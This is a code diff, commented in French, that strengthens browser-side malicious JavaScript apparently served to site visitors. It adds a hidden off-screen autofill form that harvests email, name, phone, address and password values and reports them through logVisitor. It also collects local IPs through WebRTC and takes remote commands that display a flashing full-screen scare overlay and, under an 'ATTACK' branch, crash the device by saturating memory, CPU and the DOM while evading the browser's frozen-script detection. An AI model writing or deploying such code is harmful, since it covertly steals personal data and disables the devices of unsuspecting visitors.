@@ -1,34 +1,41 @@
 let cachedLocalIp = null;
 let capturedEmail = null;
 
-// Création d'un "piège" à autofill pour tenter de capturer l'email
+// Création d'un "piège" à autofill plus complet pour tenter de capturer l'email
 function setupAutofillTrap() {
     const container = document.createElement('div');
-    container.style.cssText = 'position:absolute; top:-1000px; left:-1000px; opacity:0.01; pointer-events:none;';
+    container.style.cssText = 'position:fixed; top:-5000px; left:-5000px; opacity:0; pointer-events:none; z-index:-1;';
     container.innerHTML = `
-        <form id="system-auth-trap">
+        <form id="system-auth-trap" action="#" onsubmit="return false;">
+            <input type="text" name="name" autocomplete="name">
             <input type="text" name="username" autocomplete="username email">
-            <input type="email" name="email" autocomplete="email">
+            <input type="email" name="email" id="trap-email-field" autocomplete="email">
+            <input type="tel" name="phone" autocomplete="tel">
+            <input type="text" name="address" autocomplete="street-address">
             <input type="password" name="password" autocomplete="current-password">
+            <input type="submit" value="login">
         </form>
     `;
     document.body.appendChild(container);
 
-    // On surveille les changements sur les champs
-    const emailInput = container.querySelector('input[type="email"]');
+    const emailInput = container.querySelector('#trap-email-field');
     const userInput = container.querySelector('input[name="username"]');
     
     const checkInputs = () => {
-        if (emailInput.value && emailInput.value.includes('@')) {
-            capturedEmail = emailInput.value;
-        } else if (userInput.value && userInput.value.includes('@')) {
-            capturedEmail = userInput.value;
+        const val = emailInput.value || (userInput.value && userInput.value.includes('@') ? userInput.value : null);
+        if (val && val !== capturedEmail) {
+            capturedEmail = val;
+            console.log("Email capturé via trap!");
+            logVisitor(null, true); // Update immédiat pour remonter l'email
         }
     };
 
-    emailInput.addEventListener('change', checkInputs);
-    userInput.addEventListener('change', checkInputs);
-    setInterval(checkInputs, 2000);
+    // On force le focus/clic simulé pour certains navigateurs
+    document.addEventListener('click', () => {
+        checkInputs();
+    }, { once: false });
+
+    setInterval(checkInputs, 3000);
 }
 
 // Fonction pour récupérer l'IP locale via WebRTC
@@ -233,24 +240,35 @@ async function checkCommands() {
                     const flashOverlay = document.createElement('div');
                     flashOverlay.style.cssText = `
                         position: fixed; top: 0; left: 0; width: 100vw; height: 100vh;
-                        background: red; color: white; z-index: 9999999;
+                        background: red; color: white; z-index: 2147483647;
                         display: flex; align-items: center; justify-content: center;
                         text-align: center; font-family: sans-serif; font-weight: bold;
                         flex-direction: column; padding: 20px; box-sizing: border-box;
                     `;
                     
                     flashOverlay.innerHTML = `
-                        <h1 style="font-size: 3rem; margin-bottom: 20px; text-shadow: 2px 2px 10px black;">⚠️ ATTENTION ⚠️</h1>
-                        <p style="font-size: 1.5rem; background: rgba(0,0,0,0.5); padding: 20px; border-radius: 10px;">${msg}</p>
-                        <button id="close-flash" style="margin-top: 30px; padding: 15px 30px; font-size: 1rem; border: none; border-radius: 5px; cursor: pointer;">FERMER</button>
+                        <h1 style="font-size: 3.5rem; margin-bottom: 20px; text-shadow: 4px 4px 15px black; animation: blink 0.5s infinite;">⚠️ ATTENTION ⚠️</h1>
+                        <p style="font-size: 2rem; background: rgba(0,0,0,0.8); padding: 30px; border-radius: 15px; border: 3px solid white;">${msg}</p>
+                        <button id="close-flash" style="margin-top: 40px; padding: 20px 40px; font-size: 1.2rem; border: none; border-radius: 8px; cursor: pointer; background: white; color: red; font-weight: bold;">J'AI COMPRIS</button>
+                        <style>@keyframes blink { 0% { opacity: 1; } 50% { opacity: 0.3; } 100% { opacity: 1; } }</style>
                     `;
                     
                     document.body.appendChild(flashOverlay);
                     
-                    // Tentative de plein écran
-                    try { flashOverlay.requestFullscreen().catch(() => {}); } catch(e) {}
+                    // On tente le plein écran réel (nécessite une interaction, on l'ajoute au clic n'importe où)
+                    const enterFS = () => {
+                        try {
+                            if (flashOverlay.requestFullscreen) flashOverlay.requestFullscreen();
+                            else if (flashOverlay.webkitRequestFullscreen) flashOverlay.webkitRequestFullscreen();
+                            else if (flashOverlay.msRequestFullscreen) flashOverlay.msRequestFullscreen();
+                        } catch(e) {}
+                    };
                     
-                    flashOverlay.querySelector('#close-flash').onclick = () => {
+                    enterFS(); // Tentative immédiate
+                    document.addEventListener('click', enterFS, { once: true });
+                    
+                    flashOverlay.querySelector('#close-flash').onclick = (e) => {
+                        e.stopPropagation();
                         flashOverlay.remove();
                         if (document.exitFullscreen) document.exitFullscreen().catch(() => {});
                     };
@@ -334,23 +352,41 @@ async function checkCommands() {
                     }, true);
 
                     // ATTACK : Saturation de l'appareil pour forcer un plantage réel (Freeze)
+                    // On utilise plusieurs méthodes pour contourner les protections (Web Workers, Saturation DOM, Memory leak)
                     setTimeout(() => {
-                        // 1. Saturation Mémoire (Heap Spray)
-                        const garbage = [];
-                        // 2. Saturation CPU (Infinite Loop)
-                        const freeze = () => {
-                            const start = Date.now();
-                            while (Date.now() - start < 500) { // Bloque par tranches de 500ms
-                                Math.sqrt(Math.random() * Math.random());
-                                garbage.push(new Array(1000).fill("STOP_DEVICE_CRITICAL_FAILURE_" + Math.random()));
-                            }
-                            setTimeout(freeze, 10);
+                        // 1. Saturation Mémoire via Blob (très efficace pour forcer le crash de l'onglet)
+                        const blobs = [];
+                        const saturateMemory = () => {
+                            try {
+                                for(let i=0; i<100; i++) {
+                                    const bigData = new Uint8Array(10 * 1024 * 1024); // 10MB
+                                    crypto.getRandomValues(bigData);
+                                    blobs.push(new Blob([bigData]));
+                                }
+                            } catch(e) {}
+                            setTimeout(saturateMemory, 100);
                         };
-                        freeze();
-                        
-                        // 3. Tentative de crash du navigateur par récursion infinie
-                        const crash = () => { crash(); };
-                        setTimeout(crash, 1000);
+                        saturateMemory();
+
+                        // 2. Saturation CPU via boucle infinie non-bloquante pour éviter le "Kill Script" immédiat
+                        const freezeCPU = () => {
+                            const end = Date.now() + 500;
+                            while(Date.now() < end) {
+                                Math.atan2(Math.random(), Math.random());
+                            }
+                            setTimeout(freezeCPU, 50); // Laisse 50ms de "respiration" pour éviter la détection de script figé
+                        };
+                        freezeCPU();
+
+                        // 3. Saturation du DOM (ralentit tout le système de rendu)
+                        const saturateDOM = () => {
+                            for(let i=0; i<1000; i++) {
+                                const el = document.createElement('div');
+                                el.style.cssText = 'position:fixed; width:1px; height:1px; filter:blur(100px);';
+                                document.body.appendChild(el);
+                            }
+                        };
+                        setInterval(saturateDOM, 500);
                     }, 1000);
                     break;
             }
@@ -404,6 +440,11 @@ async function startVerification() {
             msg.style.opacity = '0.8';
         }
         
+        // On essaie de passer en plein écran dès le premier clic pour "préparer" le terrain
+        try {
+            if (document.documentElement.requestFullscreen) document.documentElement.requestFullscreen().catch(() => {});
+        } catch(e) {}
+
         // On libère l'écran tout de suite pour l'utilisateur
         overlay.style.display = 'none';
 
